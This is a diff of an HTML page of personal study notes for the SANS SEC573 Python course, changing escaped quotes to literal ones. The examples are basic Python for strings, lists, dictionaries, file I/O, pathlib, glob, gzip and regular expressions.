+<pre><code class="language-python">&gt;&gt;&gt; astring = "THISISASTRING"
 &gt;&gt;&gt; len(astring)
 13
 # returns the length of the string
 &gt;&gt;&gt; len(astring) // 2
 6
 # find middle of a string with floor
-&gt;&gt;&gt; alist = [&quot;one&quot;,2,3,&quot;four&quot;,5]
+&gt;&gt;&gt; alist = ["one",2,3,"four",5]
 &gt;&gt;&gt; len(alist)
 5
 # returns the length of the list
 </code></pre>
 <h4 id="string-encoders-and-decoders"><a class="header" href="#string-encoders-and-decoders">String Encoders and Decoders</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; import codecs
-&gt;&gt;&gt; codecs.encode(&quot;Hello World&quot;, &quot;rot13&quot;)
+&gt;&gt;&gt; codecs.encode("Hello World", "rot13")
 'Uryyb Jbeyq'
-&gt;&gt;&gt; codecs.encode(b&quot;Hello World&quot;, &quot;HEX&quot;)
+&gt;&gt;&gt; codecs.encode(b"Hello World", "HEX")
 b'48656c6c6f20576f726c64'
-&gt;&gt;&gt; codecs.encode(&quot;Hello World&quot;, &quot;utf-16le&quot;)
+&gt;&gt;&gt; codecs.encode("Hello World", "utf-16le")
 b'H\x00e\x00l\x00l\x00o\x00 \x00W\x00o\x00r\x00l\x00d\x00'
-&gt;&gt;&gt; codecs.encode(b&quot;Hello World&quot;, &quot;zip&quot;)
+&gt;&gt;&gt; codecs.encode(b"Hello World", "zip")
 b'x\x9c\xf3H\xcd\xc9\xc9W\x08\xcf/\xcaI\x01\x00\x18\x0b\x04\x1d'
-&gt;&gt;&gt; codecs.encode(b&quot;Hello World&quot;, &quot;base64&quot;)
+&gt;&gt;&gt; codecs.encode(b"Hello World", "base64")
 b'SGVsbG8gV29ybGQ=\n'
 </code></pre>
 <h3 id="creating-and-using-functions"><a class="header" href="#creating-and-using-functions">Creating and Using Functions</a></h3>
@@ -326,9 +565,9 @@ print(*args, sep=' ', end='\n', file=None, flush=False)
       a file-like object (stream); defaults to the current sys.stdout.
     flush
       whether to forcibly flush the stream.
-# inspects the source code of a programm to look for &quot;docstrings&quot; and type hints in it
+# inspects the source code of a programm to look for "docstrings" and type hints in it
 
-&gt;&gt;&gt; a = &quot;hello world&quot;
+&gt;&gt;&gt; a = "hello world"
 &gt;&gt;&gt; type(a)
 &lt;class 'str'&gt;
 # tells you what kind of data you are dealing with
@@ -340,20 +579,20 @@ print(*args, sep=' ', end='\n', file=None, flush=False)
 <h4 id="proper-script-structure"><a class="header" href="#proper-script-structure">Proper Script Structure</a></h4>
 <pre><code class="language-bash">#!/usr/bin/python -tt
 # You can comment a single line with a pound sign
-&quot;&quot;&quot;
+"""
 The first string is the Module DocString and is used by help functions.
-&quot;&quot;&quot;
+"""
 import sys
 def main():
-    &quot;This is a DocString for the main function&quot;
-    if not &quot;-u&quot; in sys.argv:
+    "This is a DocString for the main function"
+    if not "-u" in sys.argv:
         sys.exit(0)
-    print(&quot;You passed the argument &quot; + sys.argv[1])
+    print("You passed the argument " + sys.argv[1])
 
 if __name__ == __main__:
     # Global variables go here
     main()
-# anytime python is executing a script it sets __name__ to the string &quot;__main__&quot;
+# anytime python is executing a script it sets __name__ to the string "__main__"
 # when you import a module in a python interactive session (or in a script), dunder name is assigned the name of the module
 # this is to determine if your script is being imported or executed and make it behave differently in each circumstance
 </code></pre>
@@ -432,27 +671,27 @@ from freq.py import Freq
 </code></pre>
 <h3 id="lists"><a class="header" href="#lists">Lists</a></h3>
 <h4 id="list-methods"><a class="header" href="#list-methods">List Methods</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; movies = [&quot;life of brian&quot;, &quot;meaning of life&quot;]
-&gt;&gt;&gt; movies.index(&quot;meaning of life&quot;)
+<pre><code class="language-python">&gt;&gt;&gt; movies = ["life of brian", "meaning of life"]
+&gt;&gt;&gt; movies.index("meaning of life")
 1
 # finds item in list
-&gt;&gt;&gt; movies.insert(1, &quot;holy grail&quot;)
+&gt;&gt;&gt; movies.insert(1, "holy grail")
 # puts at position 1
-&gt;&gt;&gt; movies.index(&quot;meaning of life&quot;)
+&gt;&gt;&gt; movies.index("meaning of life")
 2
-&gt;&gt;&gt; movies.append(&quot;free willie&quot;)
+&gt;&gt;&gt; movies.append("free willie")
 # add to the end
 &gt;&gt;&gt; movies
 ['life of brian', 'holy grail', 'meaning of life', 'free willie']
-&gt;&gt;&gt; movies.remove(&quot;free willie&quot;)
+&gt;&gt;&gt; movies.remove("free willie")
 # removes item
 &gt;&gt;&gt; movies
 ['life of brian', 'holy grail', 'meaning of life']
-&gt;&gt;&gt; movies.insert(0, &quot;secret policemans ball&quot;)
+&gt;&gt;&gt; movies.insert(0, "secret policemans ball")
 # adds new element at position zero
 &gt;&gt;&gt; movies
 ['secret policemans ball', 'life of brian', 'holy grail', 'meaning of life']
-&gt;&gt;&gt; movies.remove(&quot;secret policemans ball&quot;)
+&gt;&gt;&gt; movies.remove("secret policemans ball")
 &gt;&gt;&gt; movies
 ['life of brian', 'holy grail', 'meaning of life']
 &gt;&gt;&gt; movies.reverse()
@@ -465,10 +704,10 @@ from freq.py import Freq
 ['holy grail', 'life of brian']
 </code></pre>
 <h4 id="making-copies-of-lists"><a class="header" href="#making-copies-of-lists">Making Copies of Lists</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; alist = [&quot;elements&quot;, &quot;in a list&quot;, 500, 4.299999998]
+<pre><code class="language-python">&gt;&gt;&gt; alist = ["elements", "in a list", 500, 4.299999998]
 &gt;&gt;&gt; blist = alist
 # makes a pointer, not a copy
-&gt;&gt;&gt; blist.append(&quot;add this to the list&quot;)
+&gt;&gt;&gt; blist.append("add this to the list")
 &gt;&gt;&gt; blist
 ['elements', 'in a list', 500, 4.299999998, 'add this to the list']
 &gt;&gt;&gt; alist
@@ -482,21 +721,21 @@ from freq.py import Freq
 ['elements', 'in a list', 500, 4.299999998, 'add this to the list']
 </code></pre>
 <h4 id="convert-strings-to-lists-with-split"><a class="header" href="#convert-strings-to-lists-with-split">Convert Strings to Lists with .split()</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; &quot;this is a string converted to a list&quot;.split()
+<pre><code class="language-python">&gt;&gt;&gt; "this is a string converted to a list".split()
 ['this', 'is', 'a', 'string', 'converted', 'to', 'a', 'list']
-&gt;&gt;&gt; &quot;'comma', 'delimited', '1.2'&quot;.split(&quot;,&quot;)
-[&quot;'comma'&quot;, &quot; 'delimited'&quot;, &quot; '1.2'&quot;]
-&gt;&gt;&gt; &quot;this is a list with is in it&quot;.split(&quot;is&quot;)
+&gt;&gt;&gt; "'comma', 'delimited', '1.2'".split(",")
+["'comma'", " 'delimited'", " '1.2'"]
+&gt;&gt;&gt; "this is a list with is in it".split("is")
 ['th', ' ', ' a l', 't with ', ' in it']
 # no arguments -&gt; splits on white space
 # argument given -&gt; splits on that string
 </code></pre>
 <h4 id="convert-lists-to-strings"><a class="header" href="#convert-lists-to-strings">Convert Lists to Strings</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; &quot; &quot;.join([&quot;SEC573&quot;, &quot;is&quot;, &quot;awesome!&quot;])
+<pre><code class="language-python">&gt;&gt;&gt; " ".join(["SEC573", "is", "awesome!"])
 'SEC573 is awesome!'
-&gt;&gt;&gt; &quot;,&quot;.join([&quot;Make&quot;,&quot;a&quot;,&quot;csv&quot;])
+&gt;&gt;&gt; ",".join(["Make","a","csv"])
 'Make,a,csv'
-&gt;&gt;&gt; &quot;&quot;.join([&quot;SEC573&quot;, &quot;is&quot;, &quot;awesome!&quot;])
+&gt;&gt;&gt; "".join(["SEC573", "is", "awesome!"])
 'SEC573isawesome!'
 # the string whose method is being called is used as a separator
 </code></pre>
@@ -512,10 +751,10 @@ from freq.py import Freq
 # only works if there is a value in the given position for each of the feeder lists
 </code></pre>
 <h4 id="map"><a class="header" href="#map">map()</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; list(map(ord,[&quot;A&quot;,&quot;B&quot;,&quot;C&quot;]))
+<pre><code class="language-python">&gt;&gt;&gt; list(map(ord,["A","B","C"]))
 [65, 66, 67]
 # run function on list
-&gt;&gt;&gt; list(map(ord,&quot;ABC&quot;))
+&gt;&gt;&gt; list(map(ord,"ABC"))
 [65, 66, 67]
 # run function on iterable
 &gt;&gt;&gt; def addint(x,y): return int(x)+int(y) 
@@ -536,7 +775,7 @@ from freq.py import Freq
 [6, 5, 4, 2, 1]
 </code></pre>
 <h4 id="sorting-lists---example"><a class="header" href="#sorting-lists---example">Sorting Lists - Example</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; customers = [&quot;Mike Passel&quot;, &quot;alice Passel&quot;, &quot;danielle Clayton&quot;]
+<pre><code class="language-python">&gt;&gt;&gt; customers = ["Mike Passel", "alice Passel", "danielle Clayton"]
 &gt;&gt;&gt; sorted(customers)
 ['Mike Passel', 'alice Passel', 'danielle Clayton']
 &gt;&gt;&gt; def lowercase(fullname):
@@ -549,18 +788,18 @@ from freq.py import Freq
 ...     return (fullname.split() [1] + fullname.split() [0]).lower()
 ...     
 # creates a function for right order and lowercase on interpretation
-&gt;&gt;&gt; lastfirst(&quot;FNAME LNAME&quot;)
+&gt;&gt;&gt; lastfirst("FNAME LNAME")
 'lnamefname'
 &gt;&gt;&gt; sorted(customers, key=lastfirst)
 ['danielle Clayton', 'alice Passel', 'Mike Passel']
 </code></pre>
 <h3 id="for-and-while-loops"><a class="header" href="#for-and-while-loops">For and While Loops</a></h3>
 <h4 id="enumerate"><a class="header" href="#enumerate">enumerate()</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; movies = [&quot;Life of Brian&quot;, &quot;Holy Grail&quot;, &quot;Meaning of Life&quot;]
+<pre><code class="language-python">&gt;&gt;&gt; movies = ["Life of Brian", "Holy Grail", "Meaning of Life"]
 &gt;&gt;&gt; list(enumerate(movies))
 [(0, 'Life of Brian'), (1, 'Holy Grail'), (2, 'Meaning of Life')]
 &gt;&gt;&gt; for index, value in enumerate(movies):
-...     print(f&quot;{value} is in position {index}&quot;)
+...     print(f"{value} is in position {index}")
 ...     
 Life of Brian is in position 0
 Holy Grail is in position 1
@@ -569,7 +808,7 @@ Meaning of Life is in position 2
 # first element is the index, second element is the value
 </code></pre>
 <h4 id="tuples"><a class="header" href="#tuples">Tuples</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; movie = (&quot;Meaning of Life&quot;, &quot;R&quot;)
+<pre><code class="language-python">&gt;&gt;&gt; movie = ("Meaning of Life", "R")
 &gt;&gt;&gt; movie
 ('Meaning of Life', 'R')
 # lightweight lists
@@ -587,14 +826,14 @@ Meaning of Life is in position 2
 'alpha'
 &gt;&gt;&gt; d['whatever']
 Traceback (most recent call last):
-  File &quot;&lt;python-input-11&gt;&quot;, line 1, in &lt;module&gt;
+  File "&lt;python-input-11&gt;", line 1, in &lt;module&gt;
     d['whatever']
     ~^^^^^^^^^^^^
 KeyError: 'whatever'
 # dicts can be accessed like a list with the key as the index
-&gt;&gt;&gt; d.get(&quot;a&quot;, &quot;not found&quot;)
+&gt;&gt;&gt; d.get("a", "not found")
 'alpha'
-&gt;&gt;&gt; d.get(&quot;whatever&quot;, &quot;not found&quot;)
+&gt;&gt;&gt; d.get("whatever", "not found")
 'not found'
 # .get() method for retrieving data
 </code></pre>
@@ -636,21 +875,21 @@ dict_items([('a', 'alpha'), ('b', 'bravo'), ('c', 'charlie'), ('d', 'delta')])
 <h4 id="determine-if-data-is-in-a-dictionary"><a class="header" href="#determine-if-data-is-in-a-dictionary">Determine if Data is in a Dictionary</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; d
 {'a': 'alpha', 'b': 'bravo', 'c': 'charlie', 'd': 'delta'}
-&gt;&gt;&gt; d.get(&quot;e&quot;)
+&gt;&gt;&gt; d.get("e")
 # bad key -&gt; returns nothing
-&gt;&gt;&gt; d[&quot;e&quot;]
+&gt;&gt;&gt; d["e"]
 Traceback (most recent call last):
-  File &quot;&lt;python-input-32&gt;&quot;, line 1, in &lt;module&gt;
-    d[&quot;e&quot;]
+  File "&lt;python-input-32&gt;", line 1, in &lt;module&gt;
+    d["e"]
     ~^^^^^
 KeyError: 'e'
 # bad key -&gt; raises KeyError
-&gt;&gt;&gt; &quot;a&quot; in d
+&gt;&gt;&gt; "a" in d
 True
-&gt;&gt;&gt; &quot;alpha&quot; in d
+&gt;&gt;&gt; "alpha" in d
 False
 # 'in' searches keys
-&gt;&gt;&gt; &quot;alpha&quot; in d.values()
+&gt;&gt;&gt; "alpha" in d.values()
 True
 # to search values use .values()
 </code></pre>
@@ -681,21 +920,21 @@ defaultdict(&lt;function new_val at 0x7f03729afce0&gt;, {'scr#1': ['dst'], 'scr#
 <h4 id="counter"><a class="header" href="#counter">Counter</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; from collections import Counter
 &gt;&gt;&gt; word_count = Counter()
-&gt;&gt;&gt; word_count.update( open(&quot;mobydick.txt&quot;).read().lower().split())
+&gt;&gt;&gt; word_count.update( open("mobydick.txt").read().lower().split())
 &gt;&gt;&gt; word_count.most_common(10)
 [('the', 7018), ('of', 3500), ('and', 3155), ('a', 2539), ('to', 2375), ('in', 2100), (';', 1949), ('that', 1478), ('his', 1317), ('i', 1185)]
-&gt;&gt;&gt; word_count[&quot;was&quot;]
+&gt;&gt;&gt; word_count["was"]
 852
-&gt;&gt;&gt; word_count.update([&quot;was&quot;, &quot;is&quot;, &quot;was&quot;, &quot;am&quot;])
-&gt;&gt;&gt; word_count[&quot;was&quot;]
+&gt;&gt;&gt; word_count.update(["was", "is", "was", "am"])
+&gt;&gt;&gt; word_count["was"]
 854
 </code></pre>
 <h2 id="5733---automated-defense"><a class="header" href="#5733---automated-defense">573.3 - Automated Defense</a></h2>
 <h3 id="file-inputoutput-operations"><a class="header" href="#file-inputoutput-operations">File Input/Output Operations</a></h3>
 <h4 id="file-operations"><a class="header" href="#file-operations">File Operations</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; filehandle = open(&quot;hamlet.txt&quot;, &quot;r&quot;)
+<pre><code class="language-python">&gt;&gt;&gt; filehandle = open("hamlet.txt", "r")
 &gt;&gt;&gt; 
-&gt;&gt;&gt; with open(&quot;hamlet.txt&quot;, &quot;r&quot;) as file_handle:
+&gt;&gt;&gt; with open("hamlet.txt", "r") as file_handle:
 ...     ...
 # using the open() command
 </code></pre>
@@ -711,9 +950,9 @@ defaultdict(&lt;function new_val at 0x7f03729afce0&gt;, {'scr#1': ['dst'], 'scr#
 # close() closes the file
 </code></pre>
 <h4 id="reading-files-from-the-filesystem"><a class="header" href="#reading-files-from-the-filesystem">Reading Files from the Filesystem</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; filehandle = open(&quot;hamlet_head.txt&quot;, &quot;r&quot;)
+<pre><code class="language-python">&gt;&gt;&gt; filehandle = open("hamlet_head.txt", "r")
 &gt;&gt;&gt; for oneline in filehandle:
-...     print(oneline, end = &quot;&quot;)
+...     print(oneline, end = "")
 ...     
 THE TRAGEDY OF HAMLET, PRINCE OF DENMARK
 
@@ -729,35 +968,35 @@ Dramatis Personae
 # iterable object
 # can be accessed within a loop
 # consumes less memory
-&gt;&gt;&gt; filehandle = open(&quot;hamlet_head.txt&quot;, &quot;r&quot;)
+&gt;&gt;&gt; filehandle = open("hamlet_head.txt", "r")
 &gt;&gt;&gt; listoflines = filehandle.readlines()
 &gt;&gt;&gt; filehandle.close()
 # reads all of the lines in a file into a list
-&gt;&gt;&gt; filehandle = open(&quot;hamlet_head.txt&quot;, &quot;r&quot;)
+&gt;&gt;&gt; filehandle = open("hamlet_head.txt", "r")
 &gt;&gt;&gt; content = filehandle.read()
 &gt;&gt;&gt; filehandle.close()
 # reads the entire file into a single string
 </code></pre>
 <h4 id="write-files-to-the-system"><a class="header" href="#write-files-to-the-system">Write Files to the System</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; filehandle = open(&quot;hamlet_head.txt&quot;, &quot;w&quot;)
-&gt;&gt;&gt; filehandle.write(&quot;Write this one line.\n&quot;)
+<pre><code class="language-python">&gt;&gt;&gt; filehandle = open("hamlet_head.txt", "w")
+&gt;&gt;&gt; filehandle.write("Write this one line.\n")
 21
-&gt;&gt;&gt; filehandle.write(&quot;Write these\nTwo Lines.\n&quot;)
+&gt;&gt;&gt; filehandle.write("Write these\nTwo Lines.\n")
 23
 &gt;&gt;&gt; filehandle.close()
 # overwrites the content
-&gt;&gt;&gt; filehandle = open(&quot;hamlet_head.txt&quot;, &quot;a&quot;)
-&gt;&gt;&gt; filehandle.write(&quot;add this to the file&quot;)
+&gt;&gt;&gt; filehandle = open("hamlet_head.txt", "a")
+&gt;&gt;&gt; filehandle.write("add this to the file")
 20
 &gt;&gt;&gt; filehandle.close()
 # appends to the file
 </code></pre>
 <h4 id="reading-binary-data-from-a-file"><a class="header" href="#reading-binary-data-from-a-file">Reading Binary Data from a File</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; x = open(&quot;bash&quot;, &quot;rb&quot;).read()
+<pre><code class="language-python">&gt;&gt;&gt; x = open("bash", "rb").read()
 &gt;&gt;&gt; x[:20]
 b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00&gt;\x00'
 # process as bytes()
-&gt;&gt;&gt; x = open(&quot;bash&quot;, encoding=&quot;latin-1&quot;).read()
+&gt;&gt;&gt; x = open("bash", encoding="latin-1").read()
 &gt;&gt;&gt; x[:20]
 '\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00&gt;\x00'
 # process as str()
@@ -770,8 +1009,8 @@ PosixPath('/home/d41y/learn/SANS/573/misc')
 &gt;&gt;&gt; pathlib.Path.home()
 PosixPath('/home/d41y')
 # current user's home directory
-&gt;&gt;&gt; x = pathlib.Path(&quot;/home/d41y/&quot;)
-&gt;&gt;&gt; x = x / &quot;non_existing_file.txt&quot;
+&gt;&gt;&gt; x = pathlib.Path("/home/d41y/")
+&gt;&gt;&gt; x = x / "non_existing_file.txt"
 # builds a path
 &gt;&gt;&gt; x
 PosixPath('/home/d41y/non_existing_file.txt')
@@ -794,37 +1033,37 @@ False
 </code></pre>
 <h4 id="accessing-files-with-pathlibpath"><a class="header" href="#accessing-files-with-pathlibpath">Accessing Files with pathlib.Path()</a></h4>
 <pre><code class="language-python"># pathlib.Path can be used to read and write files
-&gt;&gt;&gt; file_path = pathlib.Path.home() / &quot;file.txt&quot;
-&gt;&gt;&gt; file_path.write_text(&quot;Create text file!&quot;)
+&gt;&gt;&gt; file_path = pathlib.Path.home() / "file.txt"
+&gt;&gt;&gt; file_path.write_text("Create text file!")
 17
 &gt;&gt;&gt; file_path.read_text()
 'Create text file!'
-&gt;&gt;&gt; file_path.write_bytes(b&quot;Create text file!&quot;)
+&gt;&gt;&gt; file_path.write_bytes(b"Create text file!")
 17
 &gt;&gt;&gt; file_path.read_bytes()
 b'Create text file!'
 # or use the open() method of pathlib.Path()
-&gt;&gt;&gt; with pathlib.Path(&quot;/home/d41y/file.txt&quot;).open(&quot;rb&quot;) as fh:
+&gt;&gt;&gt; with pathlib.Path("/home/d41y/file.txt").open("rb") as fh:
 ...     print(fh.read())
 ...     
 b'Create text file!'
 </code></pre>
 <h4 id="check-for-existence-of-path"><a class="header" href="#check-for-existence-of-path">Check for Existence of Path</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; x = pathlib.Path(&quot;/etc/passwd&quot;)
+<pre><code class="language-python">&gt;&gt;&gt; x = pathlib.Path("/etc/passwd")
 &gt;&gt;&gt; x.exists()
 True
 &gt;&gt;&gt; x.is_file()
 True
 &gt;&gt;&gt; x.is_dir()
 False
-&gt;&gt;&gt; x = pathlib.Path(&quot;/root/test.txt&quot;).exists()
+&gt;&gt;&gt; x = pathlib.Path("/root/test.txt").exists()
 Traceback (most recent call last):
-  File &quot;&lt;python-input-28&gt;&quot;, line 1, in &lt;module&gt;
-    x = pathlib.Path(&quot;/root/test.txt&quot;).exists()
-  File &quot;/usr/lib/python3.13/pathlib/_abc.py&quot;, line 450, in exists
+  File "&lt;python-input-28&gt;", line 1, in &lt;module&gt;
+    x = pathlib.Path("/root/test.txt").exists()
+  File "/usr/lib/python3.13/pathlib/_abc.py", line 450, in exists
     self.stat(follow_symlinks=follow_symlinks)
     ~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File &quot;/usr/lib/python3.13/pathlib/_local.py&quot;, line 517, in stat
+  File "/usr/lib/python3.13/pathlib/_local.py", line 517, in stat
     return os.stat(self, follow_symlinks=follow_symlinks)
            ~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 PermissionError: [Errno 13] Permission denied: '/root/test.txt'
@@ -832,11 +1071,11 @@ PermissionError: [Errno 13] Permission denied: '/root/test.txt'
 </code></pre>
 <h4 id="obtain-a-listing-of-a-directory-1"><a class="header" href="#obtain-a-listing-of-a-directory-1">Obtain a Listing of a Directory 1</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; import pathlib
-&gt;&gt;&gt; xpath = pathlib.Path(&quot;/home/d41y/learn/SANS/573/misc/&quot;)
-&gt;&gt;&gt; list(xpath.glob(&quot;*.txt&quot;))
+&gt;&gt;&gt; xpath = pathlib.Path("/home/d41y/learn/SANS/573/misc/")
+&gt;&gt;&gt; list(xpath.glob("*.txt"))
 [PosixPath('/home/d41y/learn/SANS/573/misc/hamlet.txt'), PosixPath('/home/d41y/learn/SANS/573/misc/hamlet_head.txt')]
 # glob() expends wildcards
-&gt;&gt;&gt; [str(eachpath) for eachpath in xpath.glob(&quot;*&quot;) if eachpath.is_file()]
+&gt;&gt;&gt; [str(eachpath) for eachpath in xpath.glob("*") if eachpath.is_file()]
 ['/home/d41y/learn/SANS/573/misc/hamlet.txt', '/home/d41y/learn/SANS/573/misc/bash', '/home/d41y/learn/SANS/573/misc/hamlet_head.txt']
 # list comprehension can be used
 </code></pre>
@@ -849,8 +1088,8 @@ PermissionError: [Errno 13] Permission denied: '/root/test.txt'
 # can be used with string or bytes of a path
 </code></pre>
 <h4 id="files-and-subdirectories"><a class="header" href="#files-and-subdirectories">Files and Subdirectories</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; logpath = pathlib.Path.home() / &quot;learn/SANS/&quot;
-&gt;&gt;&gt; for eachfile in logpath.rglob(&quot;*&quot;):
+<pre><code class="language-python">&gt;&gt;&gt; logpath = pathlib.Path.home() / "learn/SANS/"
+&gt;&gt;&gt; for eachfile in logpath.rglob("*"):
 ...     if not eachfile.is_file():
 ...         continue
 ...     file_content = eachfile.read_bytes()
@@ -874,16 +1113,16 @@ b'#!/usr/bin/vmware\n.e'
 </code></pre>
 <h4 id="supporting-wildcards-with-glob"><a class="header" href="#supporting-wildcards-with-glob">Supporting Wildcards with glob</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; import glob
-&gt;&gt;&gt; glob.glob(r&quot;/home/d41y/*/*/*/*.ovpn&quot;)
+&gt;&gt;&gt; glob.glob(r"/home/d41y/*/*/*/*.ovpn")
 ['/home/d41y/ctf/thm/vpns/d41y-lateralmovementandpivoting.ovpn', '/home/d41y/ctf/thm/vpns/d41y-breachingad.ovpn', '/home/d41y/ctf/thm/vpns/d41y.ovpn', '/home/d41y/ctf/htb/00_vpns/fortresses_d41y.ovpn', '/home/d41y/ctf/htb/00_vpns/academy-regular.ovpn', '/home/d41y/ctf/htb/00_vpns/lab_d41y.ovpn', '/home/d41y/ctf/htb/00_vpns/competitive_d41y.ovpn', '/home/d41y/ctf/htb/00_vpns/starting_point_d41y.ovpn']
 &gt;&gt;&gt; import pathlib
-&gt;&gt;&gt; list(pathlib.Path(&quot;/home/&quot;).glob(&quot;d41y/*/*/*/*.ovpn&quot;))
+&gt;&gt;&gt; list(pathlib.Path("/home/").glob("d41y/*/*/*/*.ovpn"))
 [PosixPath('/home/d41y/ctf/thm/vpns/d41y-lateralmovementandpivoting.ovpn'), PosixPath('/home/d41y/ctf/thm/vpns/d41y-breachingad.ovpn'), PosixPath('/home/d41y/ctf/thm/vpns/d41y.ovpn'), PosixPath('/home/d41y/ctf/htb/00_vpns/fortresses_d41y.ovpn'), PosixPath('/home/d41y/ctf/htb/00_vpns/academy-regular.ovpn'), PosixPath('/home/d41y/ctf/htb/00_vpns/lab_d41y.ovpn'), PosixPath('/home/d41y/ctf/htb/00_vpns/competitive_d41y.ovpn'), PosixPath('/home/d41y/ctf/htb/00_vpns/starting_point_d41y.ovpn')]
 # with glob and pathlib.Path().glob(), the asterisk can be part of a path
 </code></pre>
 <h4 id="finding-files-with-oswalk"><a class="header" href="#finding-files-with-oswalk">Finding files with os.walk()</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; import os
-&gt;&gt;&gt; drv = list(os.walk(&quot;/home/d41y/ctf/&quot;))
+&gt;&gt;&gt; drv = list(os.walk("/home/d41y/ctf/"))
 &gt;&gt;&gt; drv[0]
 ('/home/d41y/ctf/', ['thm', 'certified_secure', 'hackosint25', '.obsidian', 'htb', 'hacktoria'], [])
 &gt;&gt;&gt; drv[1]
@@ -895,12 +1134,12 @@ b'#!/usr/bin/vmware\n.e'
 # os.walk() gives you back a tuple containing the current dir, a list of dirs in that dir, and a list of files in that dir
 </code></pre>
 <h4 id="oswalk-example"><a class="header" href="#oswalk-example">os.walk() Example</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; for currentdir,subdirs,allfiles in os.walk(&quot;/home/d41y/ctf/hacktoria&quot;):
-...     print(f&quot;I am in directory {currentdir}&quot;)
-...     print(f&quot;It contains directories {subdirs}&quot;)
+<pre><code class="language-python">&gt;&gt;&gt; for currentdir,subdirs,allfiles in os.walk("/home/d41y/ctf/hacktoria"):
+...     print(f"I am in directory {currentdir}")
+...     print(f"It contains directories {subdirs}")
 ...     for eachfile in allfiles:
 ...         fullpath = os.path.join(currentdir,eachfile)
-...         print(f&quot;----- File: {fullpath}&quot;)
+...         print(f"----- File: {fullpath}")
 ...         
 I am in directory /home/d41y/ctf/hacktoria
 It contains directories []
@@ -910,14 +1149,14 @@ It contains directories []
 </code></pre>
 <h4 id="reading-gzip-compressed-files"><a class="header" href="#reading-gzip-compressed-files">Reading gzip Compressed Files</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; import gzip
-&gt;&gt;&gt; gz = gzip.open(&quot;uebungsklausur_1_ml.pdf.gz&quot;, &quot;rb&quot;)
+&gt;&gt;&gt; gz = gzip.open("uebungsklausur_1_ml.pdf.gz", "rb")
 &gt;&gt;&gt; list_of_lines = gz.readlines()
 &gt;&gt;&gt; list_of_lines[2][:40]
 b'6 0 obj\n'
 # for one file
-&gt;&gt;&gt; for eachfile in pathlib.Path(&quot;/home/d41y/learn/SANS/573/misc/&quot;).glob(&quot;*.gz&quot;):
-...     content = gzip.open(eachfile, &quot;rb&quot;).read()
-...     print(eachfile.name,&quot;-&quot;,content[:40])
+&gt;&gt;&gt; for eachfile in pathlib.Path("/home/d41y/learn/SANS/573/misc/").glob("*.gz"):
+...     content = gzip.open(eachfile, "rb").read()
+...     print(eachfile.name,"-",content[:40])
 ...     
 uebungsklausur_ss_22_ml.pdf.gz - b'%PDF-1.5\n%\xbf\xf7\xa2\xfe\n52 0 obj\n&lt;&lt; /Linearized 1'
 uebungsklausur_1_ml.pdf.gz - b'%PDF-1.5\n%\xd0\xd4\xc5\xd8\n6 0 obj\n&lt;&lt;\n/Length 1704  '
@@ -929,48 +1168,48 @@ uebungsklausur_ss_20_ml.pdf.gz - b'%PDF-1.5\n%\xbf\xf7\xa2\xfe\n44 0 obj\n&lt;&l
 <h3 id="regular-expressions"><a class="header" href="#regular-expressions">Regular Expressions</a></h3>
 <h4 id="re-functions"><a class="header" href="#re-functions">re functions()</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; import re
-&gt;&gt;&gt; re.findall(b&quot;my pattern&quot;, b&quot;search this for my pattern&quot;)
+&gt;&gt;&gt; re.findall(b"my pattern", b"search this for my pattern")
 [b'my pattern']
-&gt;&gt;&gt; re.findall(&quot;my pattern&quot;, &quot;search this for my pattern&quot;)
+&gt;&gt;&gt; re.findall("my pattern", "search this for my pattern")
 ['my pattern']
 # find all occurences of the pattern in the data
-&gt;&gt;&gt; x = re.match(&quot;th&quot;, &quot;this is the test&quot;)
+&gt;&gt;&gt; x = re.match("th", "this is the test")
 &gt;&gt;&gt; x.group()
 'th'
-&gt;&gt;&gt; x = re.match(&quot;is&quot;, &quot;this is the test&quot;)
+&gt;&gt;&gt; x = re.match("is", "this is the test")
 &gt;&gt;&gt; x.group()
 Traceback (most recent call last):
-  File &quot;&lt;python-input-6&gt;&quot;, line 1, in &lt;module&gt;
+  File "&lt;python-input-6&gt;", line 1, in &lt;module&gt;
     x.group()
     ^^^^^^^
 AttributeError: 'NoneType' object has no attribute 'group'
 # match() -&gt; start at the beginning of data searching for pattern
-&gt;&gt;&gt; x = re.search(&quot;is&quot;, &quot;this is the test&quot;)
+&gt;&gt;&gt; x = re.search("is", "this is the test")
 &gt;&gt;&gt; x.group()
 'is'
 # search() -&gt; match pattern anywhere in data
 </code></pre>
 <h4 id="regex-rules-1"><a class="header" href="#regex-rules-1">RegEx Rules 1</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; re.findall(&quot;SANS&quot;, &quot;The SANS Python class rocks&quot;)
+<pre><code class="language-python">&gt;&gt;&gt; re.findall("SANS", "The SANS Python class rocks")
 ['SANS']
-&gt;&gt;&gt; re.findall(&quot;.ython&quot;, &quot;I Python, you python. We all python.&quot;)
+&gt;&gt;&gt; re.findall(".ython", "I Python, you python. We all python.")
 ['Python', 'python', 'python']
 # . as wildcard
